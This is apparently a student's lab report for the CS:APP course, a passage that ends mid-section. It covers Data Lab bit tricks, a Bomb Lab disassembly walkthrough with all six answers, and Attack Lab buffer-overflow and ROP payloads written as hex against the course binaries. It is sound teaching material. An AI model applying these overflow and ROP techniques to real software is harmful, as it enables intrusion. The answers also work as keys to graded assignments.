# CSAPP 实验报告

PB20000180 刘良宇

## 实验环境

![](srcs/version.png)

ubuntu 21.10, x86_64

## Data Lab

### 0. Pre

一上来读完实验说明，试图先编译测试用程序 `btest`，

```bash
make btest
```

但报错如下：

```bash
/usr/include/limits.h:26:10: fatal error: bits/libc-header-start.h: 没有那个文件或目录
```

查看编译选项发现 `m32`，为了确保实验不出现意外，选择安装 32 位依赖库：

```bash
sudo apt-get install gcc-multilib
```

成功编译 `btest`

附 Readme 中实验要求：

1. 只允许使用 0 - 255 之间的整数常量
2. 不允许使用全局变量
3. 一元运算符 ! ~
4. 二元运算符 & ^ | + << >>

不能：

1. Use any control constructs such as if, do, while, for, switch, etc.
2. Define or use any macros.
3. Define any additional functions in this file.
4. Call any functions.
5. Use any other operations, such as &&, ||, -, or ?:
6. Use any form of casting.
7. Use any data type other than int. This implies that you
   cannot use arrays, structs, or unions.

可以假定：

1. Uses 2s complement, 32-bit representations of integers.
2. Performs right shifts arithmetically.
3. Has unpredictable behavior when shifting if the shift amount is less than 0 or greater than 31.

### 1. bitXor

用 ~ & 实现 ^

异或用与非式表达即可。假设 $A,B$ 是两个布尔变量：

$A \oplus B = A\overline{B}+\overline{A}B = \overline{\overline{A\overline{B}} \ \overline{\overline{A}B}}$

所以补全程序：

```cpp
return ~(~(x & (~y)) & ~(y & (~x)));
```

![](srcs/1-bitXor.png)

### 2. tmin

返回最小的补码表示下的整数

32 位下是 `x80000000`， 1 左移 31 位即可

```cpp
return 1 << 31;
```

### 3. isTmax

判断一个数是不是最大的补码表示下的整数

对 x 变形，考察数字特征。注意排除特例

```cpp
int neg1;
neg1 = !(~x);
return !((~(x + 1) ^ x) | neg1);
```

### 4. allOddBits

判断与 0xAAAAAAAA 与后数字是否仍为 0xAAAAAAAA 即可

```cpp
int all_odd = 0xAA + (0xAA << 8) + (0xAA << 16) + (0xAA << 24);
return !((x & all_odd) ^ all_odd);
```

### 5. negate

取反加 1

```cpp
return (~x) + 1;
```

### 6. isAsciiDigit

需要分别判断是否大于等于，小于等于

如果有其中一者不满足，那么就返回 0

因此采用逻辑 `!(isUpper | isLower)`

```cpp
int sign = 1 << 31;

int isUpper = sign & ((~(sign | 0x39)) + x) >> 31;
int isLower = sign & ((~0x30) + 1 + x) >> 31;

return !(isUpper | isLower);
```

### 7. conditional

条件表达式，我们希望 x 是否成立作为条件，并且结果映射到 {0, 0xffffffff}， 后续就很好处理了

```cpp
int is_x = !x + ~0;        // 若 x 成立，为 0xffffffff
int is_not_x = ~is_x;      // 若 x 不成立，为 0xffffffff
// 如果 is_x 是 0xffffffff，取 y，否则取 z
return (y & is_x) + (z & is_not_x);
```

### 8. isLessOrEqual

$x \le y \iff y - x \ge 0$

- 如果 $y$ 非负 $x$ 负，成立
- 如果 $y$ 负 $x$ 非负，不成立
- 否则判断 $y-x$ （保证不发生算数溢出）

```cpp
int sign = 1 << 31;
int cond1 = (!(y & sign)) & (!!(x & sign));
int cond2 = (!(x & sign)) & (!!(y & sign));
int cond3 = !((y + ~x + 1) & (1 << 31));
return cond1 | ((!cond2) & cond3);
```

条件 1 满足，答案为 1，否则需要条件 2 不满足，条件 3 满足才返回 1

### 9. logicalNeg

实现逻辑非，则需要对 0 进行判断

考察 0 的特征：对于正数，负数，其相反数的符号位（基本会发生变化），特例：int_min，但总而言之一组相反数符号位必定有 1

但 0 和 0 的相反数（自身）符号位都为 0，所以可以据此判断：

```cpp
return ((x | (~x + 1)) >> 31) + 1;
```

### 10. howManyBits

本题正数和负数判断的逻辑是不一样的：负数中间的多余的 1 相当于可以省去

所以首先统一对正数和负数的判断：

```cpp
int sign = x >> 31;
x = (sign & ~x) | (~sign & x);
```

如果 x 为负数，则取反（和正数统一到找最高位为 1 的）

剩下的部分类似于数字电路中的优先编码器, 仿照逻辑编写每一位即可：

```cpp
int b16, b8, b4, b2, b1, b0;

b16 = !!(x >> 16) << 4;
x = x >> b16;
b8 = !!(x >> 8) << 3;
x = x >> b8;
b4 = !!(x >> 4) << 2;
x = x >> b4;
b2 = !!(x >> 2) << 1;
x = x >> b2;
b1 = !!(x >> 1);
x = x >> b1;
b0 = x;
return b16 + b8 + b4 + b2 + b1 + b0 + 1;
```

最后加上符号位的一位

### 11. floatScale2

特判，注意符号位如果是负数需要补上

```cpp
int expo = (uf & 0x7f800000) >> 23;
int sign = uf & (1 << 31);
if (expo == 0)
   return (uf << 1) + sign;
if (expo == 254)
   return 0x7f800000 + sign;
if (expo == 255)
   return uf;

return ((expo + 1) << 23) + (uf & 0x807fffff);
```

### 12. floatFloat2Int

主要是根据指数位判断移位方式及位数。指数为负意味着对应整数为 0，超过 32 位 int 范围的做溢出处理，并注意判断正负即可

```cpp
int floatFloat2Int(unsigned uf) {
    int expo = ((uf & 0x7f800000) >> 23) - 127;
    int sign = uf & (1 << 31);
    int frac = (uf & 0x007fffff) | 0x00800000;
    int int_val = 0;

    if (expo < 0) {  // 取整为 0
        return 0;
    }
    if (expo > 31) {  // 超过 32 位，溢出
        return 0x80000000;
    }
    if (expo < 23) {
        int_val = frac >> (23 - expo);
    } else if (expo > 23) {
        int_val = frac << (expo - 23);
    }
    return sign ? -int_val : int_val;
}
```

### 13. floatPower2

按照指数位 bias 的定义做即可

```cpp
int exp = x + 127;
if (exp <= 0)
   return 0;
if (exp >= 255)
   return 0xff << 23;
return exp << 23;
```

### X. final

![](srcs/lab1.png)

通过代码要求测试及正确性测试

## Bomb Lab

根据 .c 文件的提示，我们需要正确输入 6 个字符串

本次实验要求使用简单的反汇编，阅读汇编代码

首先拿到可执行文件，进行反汇编处理

![](srcs/lab2-1.png)

接下来的实验内容主要是需要分析各个 phase 的汇编代码

注意以上文件仅仅是 text 段的代码数据，实际上可以使用

```bash
objdump -s bomb > bomb_att_s.s
```

导出其他区的数据（包括 data 段和 rodata 段，即已经初始化的全局变量区和全局常量区，这个在后面会很实用）

### phase1

![](srcs/2-1.png)

不难发现，通过调用 `strings_not_equal` 这一函数判断输入字符串和给定字符串是否相等。

输入字符串的地址和 `0x402400` 作为 `strings_not_equal` 的两个参数被传入

`0x402400` 看起来像是一个地址，根据调用函数名，我们也可以猜测， `0x402400` 就是我们需要的字符串的地址

可以使用 gdb，在调用函数 (`400ee9`) 前打上断点，然后此时检查 `0x402400` 处的值：

![](srcs/phase1.png)

得到了 phase1 的答案： `Border relations with Canada have never been better.`

当然，也可以直接看 rodata 段这一部分内存的数据

![](srcs/2-a1.png)

注意以 `\0` 代表字符串结束

### phase2

阅读汇编：

![](srcs/2-2.png)

注意到最早的循环在 `x400efc+x1b=x400f17` 处

```asm
400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax
```

所以先看前面的代码。阅读可得，首先栈上开辟 40 字节的内存，然后调用 `read_six_numbers`，这里应该是直接传入栈指针，读入了 6 个数，可以联系后文（栈指针 +24）：

```asm
400f35: lea    0x18(%rsp),%rbp
```

证实

读入后，第一句就是

```asm
400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)
```

所以第一个数应该是 1

随后我们来找每次循环的判断依据

```asm
# 比较下一个数
400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax
# %eax = %eax + %eax
400f1a:	01 c0                	add    %eax,%eax
400f1c:	39 03                	cmp    %eax,(%rbx)
# 再利用此时的 %eax 比较
400f1e:	74 05                	je     400f25 <phase_2+0x29>
400f20:	e8 15 05 00 00       	call   40143a <explode_bomb>
400f25:	48 83 c3 04          	add    $0x4,%rbx
# 下面判断是否比较完，没比较完就跳转回去
400f29:	48 39 eb             	cmp    %rbp,%rbx
400f2c:	75 e9                	jne    400f17 <phase_2+0x1b>
400f2e:	eb 0c                	jmp    400f3c <phase_2+0x40>
```

所以应该是个每次乘 2 的等比数列

故 phase2 答案： `1 2 4 8 16 32`

### phase3

阅读汇编：

<img src="srcs/2-3.png" style="zoom:;" />

类似 phase1，我们在调用函数 `sscanf` 前打一个断点

![](srcs/2-3-1.png)

发现 `sscanf` 应该是读入了两个整数

后面有一段跳转十分类似，我们可以先分析：它们都跳转到 `0x400fbe`，进行：

```asm
400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax
400fc2:	74 05                	je     400fc9 <phase_3+0x86>
400fc4:	e8 71 04 00 00       	call   40143a <explode_bomb>
400fc9:	48 83 c4 18          	add    $0x18,%rsp
400fcd:	c3                   	ret
```

比较操作，判断是爆炸还是返回

而我们究竟会从哪个地方跳转到 `0x400fbe` 呢？

回头看前面代码：

```asm
# 判断返回值，确保读入两个数
400f60:	83 f8 01             	cmp    $0x1,%eax
400f63:	7f 05                	jg     400f6a <phase_3+0x27>
400f65:	e8 d0 04 00 00       	call   40143a <explode_bomb>
# %rsp + 8 处内存值需要不大于 7
400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)
400f6f:	77 3c                	ja     400fad <phase_3+0x6a>
# %rsp + 8 处内存值赋值给 %eax
400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax
# 跳转 %rax * 8 + 0x402470 处储存的地址
400f75:	ff 24 c5 70 24 40 00 	jmp    *0x402470(,%rax,8)
```

`%rsp + 8` 处即为我们输入第一个数。根据输入第一个数不同，跳转位置也不同

以输入 0 为例：

![](srcs/2-3-2.png)

而：

`400f7c: b8 cf 00 00 00 mov $0xcf,%eax`

所以 `0 207` （207 即 0xcf） 是 phase3 一组合理的解

### phase4

![](srcs/2-4-2.png)

里面另外调用了一个函数 `func4`

![](srcs/2-4-1.png)

由 `0x400fe9` 和 `0x400ffe` 可得 `func4` 是一个递归函数

没有很直接的突破口，所以先把 phase4 的函数翻译

```asm
# 0x4025cf 与 phase3 相同，说明读入两个数
40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi
40101f:	b8 00 00 00 00       	mov    $0x0,%eax
401024:	e8 c7 fb ff ff       	call   400bf0 <__isoc99_sscanf@plt>
# 比较返回值，确保读入了两个数
401029:	83 f8 02             	cmp    $0x2,%eax
40102c:	75 07                	jne    401035 <phase_4+0x29>
# 第一个参数应该小于 14
40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)
401033:	76 05                	jbe    40103a <phase_4+0x2e>
401035:	e8 00 04 00 00       	call   40143a <explode_bomb>
# 传参：edi 第一个参数, esi 0, edx 14
40103a:	ba 0e 00 00 00       	mov    $0xe,%edx
40103f:	be 00 00 00 00       	mov    $0x0,%esi
401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi
401048:	e8 81 ff ff ff       	call   400fce <func4>
# func4 返回值应该是 0
40104d:	85 c0                	test   %eax,%eax
40104f:	75 07                	jne    401058 <phase_4+0x4c>
# 第二个参数为 0
401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)
401056:	74 05                	je     40105d <phase_4+0x51>
401058:	e8 dd 03 00 00       	call   40143a <explode_bomb>
```

可以发现，要求传入两个参数，第一个参数小于 14，第二个参数为 0。要求选取第一个参数，使得 func4 返回值为 0

那么我们来观察 func4 的函数。已经确定了两个参数的情况下，着重观察 `%edi`

```asm
400fe2:	39 f9                	cmp    %edi,%ecx
400fe4:	7e 0c                	jle    400ff2 <func4+0x24>
......
400ff7:	39 f9                	cmp    %edi,%ecx
400ff9:	7d 0c                	jge    401007 <func4+0x39>
```

如果为输入为 %ecx，那么应当正好能返回 0

根据前面代码：

```asm
400fce:	48 83 ec 08          	sub    $0x8,%rsp
# %eax = 14
400fd2:	89 d0                	mov    %edx,%eax
400fd4:	29 f0                	sub    %esi,%eax
400fd6:	89 c1                	mov    %eax,%ecx
# %ecx = %eax >> 31 = 0
400fd8:	c1 e9 1f             	shr    $0x1f,%ecx
# %eax += %ecx, %eax = 14
400fdb:	01 c8                	add    %ecx,%eax
# %eax = %eax >> 1 = 7
400fdd:	d1 f8                	sar    %eax
# %ecx = %rax + %rsi = 7
400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx
```

所以 phase4 输入 `7 0` 即可

### phase5

代码：

```asm
# 开辟栈空间
401062:	53                   	push   %rbx
401063:	48 83 ec 20          	sub    $0x20,%rsp
401067:	48 89 fb             	mov    %rdi,%rbx
40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
401071:	00 00
401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)
401078:	31 c0                	xor    %eax,%eax
# 字符串长度验证。应该为 6
40107a:	e8 9c 02 00 00       	call   40131b <string_length>
40107f:	83 f8 06             	cmp    $0x6,%eax
401082:	74 4e                	je     4010d2 <phase_5+0x70>
401084:	e8 b1 03 00 00       	call   40143a <explode_bomb>
401089:	eb 47                	jmp    4010d2 <phase_5+0x70>
# %ecx = %rbx + %rax
40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx
# 取低八位
40108f:	88 0c 24             	mov    %cl,(%rsp)
401092:	48 8b 14 24          	mov    (%rsp),%rdx
# 0b1111，取低 4 位
401096:	83 e2 0f             	and    $0xf,%edx
# %edx = %rdx + 0x4024b0 值
401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx
# %edx 低八位 => 0x10 + %rsp + %rax
4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)
# %rax = %rax + 1
4010a4:	48 83 c0 01          	add    $0x1,%rax
# 说明循环长度为 6
4010a8:	48 83 f8 06          	cmp    $0x6,%rax
4010ac:	75 dd                	jne    40108b <phase_5+0x29>
4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)
# %esi => 0x40245e
4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi
# %rdi => 0x10(%rsp)，即循环中的字符串
4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi
# 比较 %esi 和 %rdi 指向字符串，应该相等
4010bd:	e8 76 02 00 00       	call   401338 <strings_not_equal>
4010c2:	85 c0                	test   %eax,%eax
4010c4:	74 13                	je     4010d9 <phase_5+0x77>
4010c6:	e8 6f 03 00 00       	call   40143a <explode_bomb>
4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
4010d0:	eb 07                	jmp    4010d9 <phase_5+0x77>
4010d2:	b8 00 00 00 00       	mov    $0x0,%eax
4010d7:	eb b2                	jmp    40108b <phase_5+0x29>

# 循环赋初值
4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax
4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
4010e5:	00 00
4010e7:	74 05                	je     4010ee <phase_5+0x8c>
4010e9:	e8 42 fa ff ff       	call   400b30 <__stack_chk_fail@plt>
4010ee:	48 83 c4 20          	add    $0x20,%rsp
4010f2:	5b                   	pop    %rbx
4010f3:	c3                   	ret
```

翻译完后，我们发现需要得到 `0x4024b0` 和 `0x40245e` 处的字符串。

打断点，并检查内存：

```bash
(gdb) x/s 0x4024b0
0x4024b0 <array.3449>:  "maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"

(gdb) x/s 0x40245e
0x40245e:       "flyers"
```

当然检查 rodata 段也是可行的

![](srcs/2-a2.png)

注意解除炸弹的关键在于 `比较 %esi 和 %rdi 指向字符串`

我们已经得到了一个 "flyers"，那么另一个字符串是怎么生成的呢？

注意：

```asm
# %edx = %rdx + 0x4024b0 值
401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx
# %edx 低八位 => 0x10 + %rsp + %rax
4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)
```

关键在于 %rdx 这里起到了索引的作用，查找 `flyers` 在 `maduiersnfotvbyl` 中的索引位置，不难得到：`9, 15, 14, 5, 6, 7`

那么我们怎么生成这个索引数组呢？注意看上一句：

`401096: 83 e2 0f and $0xf,%edx`

所以这一索引数组就是我们输入字符的 ASCII 码的低 4 位

查表得到一个可能的答案： `)/.%&'`

用其他的合理的 ASCII 组合也是可行的

### phase6

最复杂的一个阶段

开头依旧是读取六个数字，这里不再赘述

接下来看后面逻辑：

```asm
40110b:	49 89 e6             	mov    %rsp,%r14
40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d
401114:	4c 89 ed             	mov    %r13,%rbp
401117:	41 8b 45 00          	mov    0x0(%r13),%eax
40111b:	83 e8 01             	sub    $0x1,%eax
40111e:	83 f8 05             	cmp    $0x5,%eax
401121:	76 05                	jbe    401128 <phase_6+0x34>
401123:	e8 12 03 00 00       	call   40143a <explode_bomb>
401128:	41 83 c4 01          	add    $0x1,%r12d
40112c:	41 83 fc 06          	cmp    $0x6,%r12d
401130:	74 21                	je     401153 <phase_6+0x5f>
401132:	44 89 e3             	mov    %r12d,%ebx
401135:	48 63 c3             	movslq %ebx,%rax
401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax
40113b:	39 45 00             	cmp    %eax,0x0(%rbp)
40113e:	75 05                	jne    401145 <phase_6+0x51>
401140:	e8 f5 02 00 00       	call   40143a <explode_bomb>
401145:	83 c3 01             	add    $0x1,%ebx
401148:	83 fb 05             	cmp    $0x5,%ebx
40114b:	7e e8                	jle    401135 <phase_6+0x41>
40114d:	49 83 c5 04          	add    $0x4,%r13
401151:	eb c1                	jmp    401114 <phase_6+0x20>
```

大概翻译一下：

```cpp
for (int i = 0; i < 6; i++){
   if (a[i] - 1 > 5) {
      explode_bomb();
   }
   for (int j = i + 1; j <= 5; j++) {
      if(a[j] == a[i]) {
         explode_bomb();
      }
   }
}
```

虽然汇编看起来有点迷惑，但还是可以理解这是限制读入的 6 个数必须不大于 6 并且互不相等。

可以在这一段之后打个断点，输入数字测试，验证这一结论。

再看下一段：

```asm
401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi
401158:	4c 89 f0             	mov    %r14,%rax
40115b:	b9 07 00 00 00       	mov    $0x7,%ecx
401160:	89 ca                	mov    %ecx,%edx
# %edx = 7 - num, num = 7 - num
401162:	2b 10                	sub    (%rax),%edx
401164:	89 10                	mov    %edx,(%rax)
# 循环读取每一个数
401166:	48 83 c0 04          	add    $0x4,%rax
40116a:	48 39 f0             	cmp    %rsi,%rax
40116d:	75 f1                	jne    401160 <phase_6+0x6c>
40116f:	be 00 00 00 00       	mov    $0x0,%esi
```

```cpp
for (int i = 0; i < 6; i++) {
   a[i] = 7 - a[i];
}
```

可见数组中的每一个数都被 7 减了。这个时候数组中的数依然是 1 到 6 的全排列

再之后：

```asm
401174:	eb 21                	jmp    401197 <phase_6+0xa3>
401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx
# 循环 6 次
40117a:	83 c0 01             	add    $0x1,%eax
40117d:	39 c8                	cmp    %ecx,%eax
40117f:	75 f5                	jne    401176 <phase_6+0x82>
# 跳出地址
401181:	eb 05                	jmp    401188 <phase_6+0x94>
401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx
401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)
40118d:	48 83 c6 04          	add    $0x4,%rsi
401191:	48 83 fe 18          	cmp    $0x18,%rsi
401195:	74 14                	je     4011ab <phase_6+0xb7>
401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx
40119a:	83 f9 01             	cmp    $0x1,%ecx
40119d:	7e e4                	jle    401183 <phase_6+0x8f>
40119f:	b8 01 00 00 00       	mov    $0x1,%eax
4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx
4011a9:	eb cb                	jmp    401176 <phase_6+0x82>

4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
4011ba:	48 89 d9             	mov    %rbx,%rcx
4011bd:	48 8b 10             	mov    (%rax),%rdx
4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)
4011c4:	48 83 c0 08          	add    $0x8,%rax
4011c8:	48 39 f0             	cmp    %rsi,%rax
4011cb:	74 05                	je     4011d2 <phase_6+0xde>
4011cd:	48 89 d1             	mov    %rdx,%rcx
4011d0:	eb eb                	jmp    4011bd <phase_6+0xc9>
4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)
```

`0x6032d0` 这个内存地址很有意思，我们还是第一次看见 `0x6` 开头的。先用系统工具看一下这是哪一片内存：

![](srcs/2-6.png)

下面系统链接的库不看，只看前三行：依次应该是 text, BSS, data

那么 `0x6032d0` 是 data 段，可直接在文件中搜索：

![](srcs/2-a3.png)

找到了一定的规律，似乎恰好 16 个字节为一组

有了这个思想指导，我们再打个断点，观察输入不同数字导致 `0x6032d0` 片内存的变化

输入 `[1, 2, 3, 4, 5, 6]`

经过 num = 7 - num 后，应该是 `[6, 5, 4, 3, 2, 1]`

![](srcs/2-6-1.png)

输入 `[6, 5, 4, 3, 2, 1]`

经过 num = 7 - num 后，应该是 `[1, 2, 3, 4, 5, 6]`

![](srcs/2-6-2.png)

发现第三列发生了变化

观察可得，第三列应该是地址值，而且依次相接恰好是数组的顺序

这样我们就明白，以上的代码应该是建立起了一个链表

那么最后一部分代码干了什么呢？

```asm
4011da:	bd 05 00 00 00       	mov    $0x5,%ebp
4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax
4011e3:	8b 00                	mov    (%rax),%eax
4011e5:	39 03                	cmp    %eax,(%rbx)
4011e7:	7d 05                	jge    4011ee <phase_6+0xfa>
4011e9:	e8 4c 02 00 00       	call   40143a <explode_bomb>
4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx

4011f2:	83 ed 01             	sub    $0x1,%ebp
4011f5:	75 e8                	jne    4011df <phase_6+0xeb>
4011f7:	48 83 c4 50          	add    $0x50,%rsp
4011fb:	5b                   	pop    %rbx
4011fc:	5d                   	pop    %rbp
4011fd:	41 5c                	pop    %r12
4011ff:	41 5d                	pop    %r13
401201:	41 5e                	pop    %r14
401203:	c3                   	ret
```

上面是链表循环遍历从表头直到末尾。遍历的循环过程不再详细翻译，只要注意标注感叹号的部分即可：这说明循环过程中一直在比较链表中相邻结点中 “第一列” （见上面的断点图片）元素的大小，要求降序排列，否则炸弹爆炸

我们手动给第一列元素大小排个降序： `3 4 5 6 1 2`

再拿 7 依次减去每一项： `4 3 2 1 6 5`

至此，6 个 phase 全部解开，成功拆除炸弹：

![](srcs/2-finish.png)

### 感想

二进制文件的调试有时只看源代码太过麻烦，掌握合理的 gdb 断点调试技巧很重要

## Attack Lab

本实验需要利用代码注入攻击和 ROP 攻击

因为本地执行 `ctarget` 直接报错，所以这里采用 vlab 提供的 ubuntu 18.04 环境进行本实验

![](srcs/3-pre.png)

### phase1

查看实验说明中给出的函数：

```cpp
void test()
{
   int val;
   val = getbuf();
   printf("No exploit. Getbuf returned 0x%x\n", val);
}

void touch1() {
   vlevel = 1;
   printf("Touch!: You called touch1()\n");
   validate(1);
   exit(0);
}
```

实验说明中提到 `getbuf` 与 c 语言标准库的 get 类似，都有内存溢出的可能。因此我们通过输入字符串的溢出，修改该函数返回地址即可进入 `touch1`，达到攻击目的

为此，首先需要查看 `getbuf` 缓冲区的大小：

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

0x28，即为 40 个字节

然后查看 `touch1` 函数的地址：

`004017c0 <touch1>:`

所以只需要在 40 个任意字节后输入这一地址即可。注意是小端序，地址需要翻转：

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

即可通过

![](srcs/3-1.png)

### phase2

首先还是看说明里的函数代码：

```cpp
void touch2(unsigned val){
   vlevel = 2;
   if (val == cookie){
      printf("Touch2!: You called touch2(0x%.8x)\n", val);
      validate(2);
   } else {
      printf("Misfire: You called touch2(0x%.8x)\n", val);
      fail(2);
   }
   exit(0);
}
```

可得这次我们在调用 `touch2` 的同时，还需要向它传入一个值为 `cookie` 值的参数，否则直接调用会判定为失败：

![](srcs/3-2-f.png)

查看反汇编：

```asm
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
```

看起来我们需要在调用 `touch2` 前修改 `%rdi` 寄存器的值。这就要求我们进行代码注入：

```asm
movq    $0x59b997fa, %rdi
pushq   0x4017ec
ret
```

如题目说明中所说，`ret` 是比较方面操作跳转地址的，所以我们采用 `ret` 指令

在跳转前，修改 `%rdi` 寄存器，并把要跳转的 `touch2` 地址压入栈

接着先汇编再反汇编：

![](srcs/3-2-1.png)

得到这段代码的机器码：

```asm
0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 69 59    mov    $0x596997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
```

这次，我们帧栈中的返回值应该改为这段注入代码的地址。我们不妨把这段注入代码放在 buf 开头，这样直接打断点，看栈指针即可获取我们需要的地址：

![](srcs/3-2-2.png)

得到 `0x5561dc78`

同理注意小端序，最后的答案如下：

```
48 c7 c7 fa 97 b9 59 68 ec 17
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

通过测试：

![](srcs/3-2-3.png)

### phase3

首先还是函数代码：

```cpp
void touch3(char *sval){
   vlevel = 3;
   if (hexmatch(cookie, sval)){
      printf("Touch3!: You called touch3(\"%s\")\n", sval);
      validate(3);
   } else {
      printf("Misfire: You called touch3(\"%s\")\n", sval);
      fail(3);
   }
   exit(0);
}
int hexmatch(unsigned val, char *sval){
   char cbuf[110];
   char *s = cbuf + random() % 100;
   sprintf(s, "%.8x", val);
   return strncmp(sval, s, 9) == 0;
}
```

与第二题很类似，也是需要进行代码注入，修改函数参数

但不同的是，这次需要传入一个字符串指针 `sval` 指向 `cookie` 的字符串表示 `0x59b997fa`，我们只能控制字符串存在栈区，但是栈区的内存随着新函数的调用 (`touch3` 和 `hexmatch`) 会被分配给新的函数，导致这片内存可能被覆盖

因此，相比 phase2 答案，我们需要做以下更改：

- 在末尾增加 cookie 的 ascii 编码表示，这样恰好会在返回地址之后，不影响正常函数调用。同时，字符串保存在了调用 `getbuf` 的 `test` 函数的帧栈内，不用担心随着 `getbuf` 的返回导致这片内存被重新分配，覆盖

- 表示 cookie 的字符串地址可以直接通过 phase2 的 %rsp 值加上字符串之前的字节数 （48, 即 0x30） 得到 `0x5561dca8`, 这也就是调用 `touch3` 应该传入的参数

- pushq 的为 `touch3` 地址，查看反汇编文件得到 `0x004018fa`

即可得到最后答案：

```
48 c7 c7 a8 dc 61 55 68 fa 18
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 35 39
62 39 39 37 66 61 00
```

并通过测试：

![](srcs/3-3.png)

### phase4

需要用到 ROP 攻击，简述一下这部分题目的原理：

rtarget 相比之前的 ctarget 更难攻击，因为：

- 开启了栈随机化，无法准确获知代码注入的地址

- PC 无法指向栈内地址，否则会直接报内存错误

但对于 rtarget，我们仍然可以利用 ROP 攻击：

ROP 攻击一般得满足如下条件

- 程序存在溢出。

- 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。

> 当我们没办法直接执行自己 inject 进去的指令时，就可以利用这个可执行文件里本来就有的程序片段来凑出我们想执行的功能，这些片段就称为 gadget

gadget 通常是 `ret` 语句结尾，我们通过内存越界更改返回地址，就可以让程序依次执行一系列 gadgets

这样，我们通过一系列 gadgets 拼凑出我们希望执行的指令，例如，如下就是一个 gadget:

```asm
0000000000400f15 <setval_210>:
  400f15: c7 07 d4 48 89 c7   movl $0xc78948d4,(%rdi)
  400f1b: c3                  retq
```

相当于执行了 `movl $0xc78948d4,(%rdi)`，也可以修改任意的起始地址，只要拼凑出的字节码执行的命令是我们需要的即可

phase4 的要求与 phase2 类似，需要修改 `%rdi` 寄存器值为 cookie 值

如何把栈内的值存到寄存器内呢？显然我们需要一条 `popq` 语句。很遗憾没有找到直接 `popq %rdi` 的 gadget，但是我们也可以和 `movq` 配合，先 `popq` 到另一个寄存器，再 `movq` 到 `%rdi`

搜索 `48 89` （这是为了 `movq` 到 `%rdi` ），找到以下 gadget

```asm
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret
```

有用字节码为 `48 89 c7`。查表得我们需要寻找 `popq` 到 `%rax` 的 gadget

搜索 `58`

```asm
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret
```

由于 `90` 恰好是 `nop`，所以我们就找到了需要的两个 gadget

得到答案（同理注意端序）：

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

通过：

![](srcs/3-4.png)

### phase5

同 phase3 类似，但是由于栈随机化，我们无法准确获知栈中插入字符串的地址

`farm.c` 里特意给了一个：

```cpp
/* Add two arguments */
long add_xy(long x, long y)
{
    return x + y;
}
